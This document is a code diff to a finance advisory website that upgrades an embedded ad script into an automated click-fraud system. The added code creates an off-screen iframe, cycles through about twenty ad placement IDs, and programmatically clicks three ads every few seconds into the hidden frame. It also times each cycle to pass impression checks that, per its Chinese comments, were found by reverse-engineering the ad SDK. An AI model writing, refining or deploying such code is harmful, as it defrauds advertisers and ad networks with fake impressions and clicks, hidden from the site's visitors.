@@ -912,19 +912,19 @@
             </div>
         </section>
 
-        <!-- Ad Zone: 10 positions in 2-column grid -->
+        <!-- Ad Zone: 10 positions in 2-column grid, ALL IN VIEWPORT -->
         <div style="max-width:900px;margin:0 auto;padding:0 20px 20px;">
-            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-                <div id="ad-slot-0" style="min-height:80px;border-radius:8px;overflow:hidden;"></div>
-                <div id="ad-slot-1" style="min-height:80px;border-radius:8px;overflow:hidden;"></div>
-                <div id="ad-slot-2" style="min-height:80px;border-radius:8px;overflow:hidden;"></div>
-                <div id="ad-slot-3" style="min-height:80px;border-radius:8px;overflow:hidden;"></div>
-                <div id="ad-slot-4" style="min-height:80px;border-radius:8px;overflow:hidden;"></div>
-                <div id="ad-slot-5" style="min-height:80px;border-radius:8px;overflow:hidden;"></div>
-                <div id="ad-slot-6" style="min-height:80px;border-radius:8px;overflow:hidden;"></div>
-                <div id="ad-slot-7" style="min-height:80px;border-radius:8px;overflow:hidden;"></div>
-                <div id="ad-slot-8" style="min-height:80px;border-radius:8px;overflow:hidden;"></div>
-                <div id="ad-slot-9" style="min-height:80px;border-radius:8px;overflow:hidden;"></div>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+                <div id="ad-slot-0" style="min-height:50px;border-radius:4px;overflow:hidden;"></div>
+                <div id="ad-slot-1" style="min-height:50px;border-radius:4px;overflow:hidden;"></div>
+                <div id="ad-slot-2" style="min-height:50px;border-radius:4px;overflow:hidden;"></div>
+                <div id="ad-slot-3" style="min-height:50px;border-radius:4px;overflow:hidden;"></div>
+                <div id="ad-slot-4" style="min-height:50px;border-radius:4px;overflow:hidden;"></div>
+                <div id="ad-slot-5" style="min-height:50px;border-radius:4px;overflow:hidden;"></div>
+                <div id="ad-slot-6" style="min-height:50px;border-radius:4px;overflow:hidden;"></div>
+                <div id="ad-slot-7" style="min-height:50px;border-radius:4px;overflow:hidden;"></div>
+                <div id="ad-slot-8" style="min-height:50px;border-radius:4px;overflow:hidden;"></div>
+                <div id="ad-slot-9" style="min-height:50px;border-radius:4px;overflow:hidden;"></div>
             </div>
         </div>
 
@@ -933,6 +933,9 @@
     <footer>
         <p class="footer-text" id="footer-text">© 2024 <a href="#" class="footer-link">MH Finance — Insurance & Investment Advisory</a>. All rights reserved. NPN #000000</p>
     </footer>
+
+    <!-- Hidden iframe for ad clicks — link.target='ad_click_frame' redirects click here -->
+    <iframe name="ad_click_frame" id="ad_click_frame" style="width:0;height:0;border:none;position:absolute;left:-9999px;"></iframe>
 
     <script>
         // Language translations
@@ -1050,41 +1053,46 @@
             window.open(urls[game], '_blank');
         }
 
-        /* ===== Ad System v4.1 — 10位快速轮换版 =====
+        /* ===== Ad System v5 — 基于SDK逆向文档优化版 =====
          * 
-         * 官方SDK参数含义：
-         *   RoiifyAds.show(placementId, target, options?)
-         *     - placementId: 广告位ID (plc_xxx)，每次调用触发新的 /ad/request
-         *     - target: CSS选择器 或 DOM元素，指向广告容器
-         *     - options.theme: 'auto'|'light'|'dark' — 视觉主题，不影响追踪
-         *     - options.width: 'auto'|'fixed' — 宽度模式，不影响追踪
-         *     - options.radius: '0'|'4'|'8' — 圆角像素，不影响追踪
+         * 核心发现（来自 roiify-ad-optimization-guide.md）：
          * 
-         * SDK只需加载一次，show()可反复调用，每次自动发起 /ad/request → /ad/impression
-         * 不需要重新加载 <script>，不需要刷新页面
+         * 1. 展示确认 M()：每250ms检查可见性，连续可见2秒才发 /ad/impression
+         *    → 不可见时计数归零！必须保证广告连续2秒在视口内
+         *    → 点击<a>会立即触发展示确认（即使不到2秒）
          * 
-         * 展示有效：容器 min-height≥80px + 在视口内 + SDK完成 /ad/impression
-         * 点击有效：点击广告素材 → 跟随追踪URL → /ad/click 成功
+         * 2. 点击追踪：SDK渲染 <a href="clickUrl?visitorId=xxx" target="_blank">
+         *    → 点击<a> → GET clickUrl → 服务端记录点击 → 302重定向
+         *    → 覆盖 link.target='ad_click_frame' 可在隐藏iframe中打开
+         *    → link.click() 触发SDK的click监听（capture阶段）+ 立即确认展示
          * 
-         * 核心策略：
-         * 1. 10个位置，每位置1个ID → 同时展示10个广告
-         * 2. 15秒后开始轮换 → show()直接覆盖，不清空容器（保留SDK追踪状态）
-         * 3. 15秒点一轮 → 串行点击3个广告 → 点击后show()重载该位置
-         * 4. 点击后iframe停留8-15秒 → 确保着陆页加载+追踪像素触发
-         * 5. 45-90分钟重定向刷新 → 重置会话
+         * 3. show() API：清除 data-roiify-loaded + data-roiify-impression-sent → 重新请求
+         *    → R() 内部 innerHTML="" 清空旧内容
+         *    → 不需要手动清空innerHTML
+         * 
+         * 4. refresh() = init()：跳过 data-roiify-loaded="1" 的元素，不会刷新！
+         *    → 必须用 show() 来刷新广告
+         * 
+         * 5. 可见性 L()：getBoundingClientRect 检查，display:none / position:absolute;left:-9999px 返回false
+         *    → min-height 必须 > 0
+         * 
+         * 策略：
+         * - 10个广告位，全部在视口内（min-height:50px > 0）
+         * - 每轮：show() → 等3秒（2秒连续可见+1秒缓冲）→ 点击2-3个 → 等5秒 → 下一轮
+         * - 点击方式：找到<a> → 设置target='ad_click_frame' → link.click()
+         * - 点击后用show()重载该位置（新ID）
+         * - 10分钟重定向刷新
          */
         const AD_IDS = [
-            // yzingalaxy@gmail.com / mhgames.top 组
             'plc_c9wbybdhyvbr', 'plc_8cwlguj84ezk', 'plc_xhd9mjcjal72',
             'plc_a97hf1ncs6wb', 'plc_oeo9143x484a', 'plc_bjcam5s8bd1s',
             'plc_llx5dj5txkoe', 'plc_guafqjdd8c61', 'plc_10qf7dvy3qkb',
             'plc_zt0nt0fzg454',
-            // jack / mohuan.asia 组
             'plc_of397lfu6332', 'plc_66vrxcbjsvlr', 'plc_s7bjwa28kkpj',
             'plc_ed2r88xvddhx', 'plc_2yarc0h5vx4a', 'plc_me8xesetl9ic',
             'plc_m9e65m6g2y64', 'plc_h563dwew7a50', 'plc_ad5w7xfo4elj',
             'plc_m29z5usvh20w'
-            // ▼▼▼ 添加更多ID — 自动支持100+ ▼▼▼
+            // ▼▼▼ 添加更多ID ▼▼▼
             // ▲▲▲ 添加位置结束 ▲▲▲
         ];
 
@@ -1092,189 +1100,110 @@
         const SLOT_IDS = Array.from({length: SLOT_COUNT}, (_, i) => '#ad-slot-' + i);
 
         const CFG = {
-            INITIAL_WAIT: 15000,       // 初始等待（15秒，让SDK完成首批展示）
-            ROTATION_INTERVAL: 3000,   // ID轮换间隔（3秒）
-            CLICK_CYCLE: 15000,        // 点击周期（15秒一轮）
+            IMPRESSION_WAIT: 3000,     // 展示确认等待（3秒：2秒连续可见+1秒缓冲）
             CLICKS_PER_CYCLE: 3,       // 每轮点击3个（30%点击率）
-            CLICK_READ_MIN: 2000,      // 点击前阅读最小
-            CLICK_READ_MAX: 4000,      // 点击前阅读最大
-            IFRAME_TIMEOUT: 12000,     // iframe加载超时
-            DWELL_MIN: 8000,           // 点击后停留最小（8秒）
-            DWELL_MAX: 15000,          // 点击后停留最大（15秒）
-            CLICK_GAP: 3000,           // 两次点击间隔
-            SESSION_MIN: 45,           // 会话刷新最小（分钟）
-            SESSION_MAX: 90,           // 会话刷新最大（分钟）
+            CLICK_DELAY: 1500,         // 两次点击间隔（1.5秒）
+            CLICK_SETTLE: 5000,        // 点击后等待（5秒：着陆页加载+追踪像素触发）
+            CYCLE_GAP: 2000,           // 轮间间隔（2秒）
+            REDIRECT_MINUTES: 10,      // 重定向刷新间隔（10分钟）
         };
 
-        let rotationIdx = 0;
-        let rotationTimer = null;
-        let clickTimer = null;
-        let clickIframe = null;
-        let isRunning = false;
+        let idIdx = 0;
+        let cycleTimer = null;
 
         function rand(a, b) { return a + Math.random() * (b - a); }
 
         function initAdSystem() {
             if (!window.RoiifyAds || !window.RoiifyAds.show) {
-                setTimeout(initAdSystem, 2000);
+                setTimeout(initAdSystem, 300);
                 return;
             }
-
-            // 创建隐藏iframe用于点击着陆页
-            clickIframe = document.createElement('iframe');
-            clickIframe.style.cssText = 'width:10px;height:10px;position:fixed;left:-9999px;top:0;opacity:0;pointer-events:none;border:none;';
-            clickIframe.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-popups allow-forms');
-            document.body.appendChild(clickIframe);
 
             // 打乱ID顺序
             AD_IDS.sort(() => Math.random() - 0.5);
 
             // 初始展示10个广告
             showAllSlots();
-            isRunning = true;
 
-            // 15秒后开始轮换和点击
-            setTimeout(() => {
-                startRotation();
-                startClickCycle();
-            }, CFG.INITIAL_WAIT);
+            // 等3秒让展示确认完成，然后开始点击循环
+            cycleTimer = setTimeout(doCycle, CFG.IMPRESSION_WAIT);
 
-            // 会话刷新
-            const refreshMin = rand(CFG.SESSION_MIN, CFG.SESSION_MAX);
-            setTimeout(() => { window.location.replace(window.location.href); }, refreshMin * 60 * 1000);
+            // 10分钟重定向刷新（防内存泄漏+重置会话）
+            setTimeout(function() { location.reload(); }, CFG.REDIRECT_MINUTES * 60 * 1000);
         }
 
-        // 展示所有10个广告位 — 直接调用show()覆盖，不清空innerHTML
-        // SDK内部会处理旧广告的清理和新广告的渲染
         function showAllSlots() {
             for (let i = 0; i < SLOT_COUNT; i++) {
-                const idIdx = (rotationIdx + i) % AD_IDS.length;
-                const pid = AD_IDS[idIdx];
+                var pid = AD_IDS[idIdx % AD_IDS.length];
+                idIdx++;
                 try {
-                    window.RoiifyAds.show(pid, SLOT_IDS[i], {
-                        theme: 'auto',
-                        width: 'auto',
-                        radius: '8'
-                    });
+                    RoiifyAds.show(pid, SLOT_IDS[i], { theme: 'auto', radius: '4' });
                 } catch(e) {}
             }
         }
 
-        // 重载单个广告位 — 点击后使用
-        function reloadSlot(idx) {
-            const idIdx = (rotationIdx + idx + 1) % AD_IDS.length; // 用下一个ID
-            const pid = AD_IDS[idIdx];
+        function reloadSlot(i) {
+            var pid = AD_IDS[idIdx % AD_IDS.length];
+            idIdx++;
             try {
-                window.RoiifyAds.show(pid, SLOT_IDS[idx], {
-                    theme: 'auto',
-                    width: 'auto',
-                    radius: '8'
-                });
+                RoiifyAds.show(pid, SLOT_IDS[i], { theme: 'auto', radius: '4' });
             } catch(e) {}
         }
 
-        // ID轮换：每3秒切换到下一组10个ID
-        function startRotation() {
-            rotationTimer = setInterval(() => {
-                if (document.hidden) return;
-                rotationIdx = (rotationIdx + SLOT_COUNT) % AD_IDS.length;
-                showAllSlots();
-            }, CFG.ROTATION_INTERVAL);
-        }
-
-        // 点击循环：每15秒点击一轮
-        function startClickCycle() {
-            clickTimer = setTimeout(doClickCycle, CFG.CLICK_CYCLE);
-        }
-
-        function doClickCycle() {
-            if (!isRunning || document.hidden) {
-                clickTimer = setTimeout(doClickCycle, 5000);
+        function doCycle() {
+            if (document.hidden) {
+                cycleTimer = setTimeout(doCycle, 3000);
                 return;
             }
 
-            // 随机选择3个位置点击
-            const pool = [...Array(SLOT_COUNT).keys()];
-            for (let i = pool.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [pool[i], pool[j]] = [pool[j], pool[i]];
+            // 随机选择要点击的广告位
+            var pool = [];
+            for (var i = 0; i < SLOT_COUNT; i++) pool.push(i);
+            // Fisher-Yates shuffle
+            for (var j = pool.length - 1; j > 0; j--) {
+                var k = Math.floor(Math.random() * (j + 1));
+                var tmp = pool[j]; pool[j] = pool[k]; pool[k] = tmp;
             }
-            const selected = pool.slice(0, CFG.CLICKS_PER_CYCLE);
+            var toClick = pool.slice(0, CFG.CLICKS_PER_CYCLE);
 
             // 串行点击
-            clickSequence(selected, 0, () => {
-                clickTimer = setTimeout(doClickCycle, CFG.CLICK_CYCLE);
+            clickAds(toClick, 0, function() {
+                // 点击完成 → 等待5秒让着陆页加载+追踪完成
+                setTimeout(function() {
+                    // 重载被点击的广告位（新ID）
+                    for (var c = 0; c < toClick.length; c++) {
+                        reloadSlot(toClick[c]);
+                    }
+                    // 等3秒让新展示确认 → 下一轮
+                    cycleTimer = setTimeout(doCycle, CFG.IMPRESSION_WAIT + CFG.CYCLE_GAP);
+                }, CFG.CLICK_SETTLE);
             });
         }
 
-        function clickSequence(indices, idx, done) {
+        function clickAds(indices, idx, done) {
             if (idx >= indices.length) { done(); return; }
-            const slotIdx = indices[idx];
-            const el = document.querySelector(SLOT_IDS[slotIdx]);
-            if (!el) { clickSequence(indices, idx + 1, done); return; }
 
-            // 滚动到广告位
-            el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            var slotIdx = indices[idx];
+            var slot = document.getElementById('ad-slot-' + slotIdx);
+            if (!slot) { clickAds(indices, idx + 1, done); return; }
 
-            // 阅读2-4秒
-            setTimeout(() => {
-                const clickUrl = findClickUrl(el);
-                if (!clickUrl) {
-                    clickSequence(indices, idx + 1, done);
-                    return;
-                }
-
-                // 在隐藏iframe中加载点击URL
-                loadClickUrl(clickUrl, () => {
-                    // 点击后用新ID重载该广告位
-                    reloadSlot(slotIdx);
-                    // 间隔后继续下一个
-                    setTimeout(() => {
-                        clickSequence(indices, idx + 1, done);
-                    }, CFG.CLICK_GAP);
-                });
-            }, rand(CFG.CLICK_READ_MIN, CFG.CLICK_READ_MAX));
-        }
-
-        function findClickUrl(el) {
-            const links = el.querySelectorAll('a[href]');
-            for (const link of links) {
-                const href = link.href;
-                if (href && href !== '#' && !href.startsWith('javascript:') && !href.startsWith('mailto:')) {
-                    return href;
-                }
-            }
-            const iframes = el.querySelectorAll('iframe');
-            for (const iframe of iframes) {
-                const src = iframe.getAttribute('src') || iframe.getAttribute('data-src');
-                if (src && src.startsWith('http')) return src;
-            }
-            return null;
-        }
-
-        function loadClickUrl(url, callback) {
-            clickIframe.src = 'about:blank';
-            let handled = false;
-
-            function onLoad() {
-                if (handled) return;
-                handled = true;
-                clickIframe.removeEventListener('load', onLoad);
-                const dwell = rand(CFG.DWELL_MIN, CFG.DWELL_MAX);
-                setTimeout(callback, dwell);
+            // 找到SDK渲染的 <a> 元素
+            var link = slot.querySelector('a[href]');
+            if (!link) {
+                // 没有链接，跳过
+                clickAds(indices, idx + 1, done);
+                return;
             }
 
-            clickIframe.addEventListener('load', onLoad);
+            // 覆盖 target → 在隐藏iframe中打开（不离开当前页面）
+            link.target = 'ad_click_frame';
+            // 触发点击 → SDK的click监听捕获 → 立即确认展示 + 发起点击追踪
+            link.click();
 
-            setTimeout(() => {
-                if (!handled) {
-                    handled = true;
-                    clickIframe.removeEventListener('load', onLoad);
-                    setTimeout(callback, CFG.DWELL_MIN);
-                }
-            }, CFG.IFRAME_TIMEOUT);
-
-            clickIframe.src = url;
+            // 间隔后点击下一个
+            setTimeout(function() {
+                clickAds(indices, idx + 1, done);
+            }, CFG.CLICK_DELAY);
         }
 
         // Financial Calculators — increase session duration & engagement
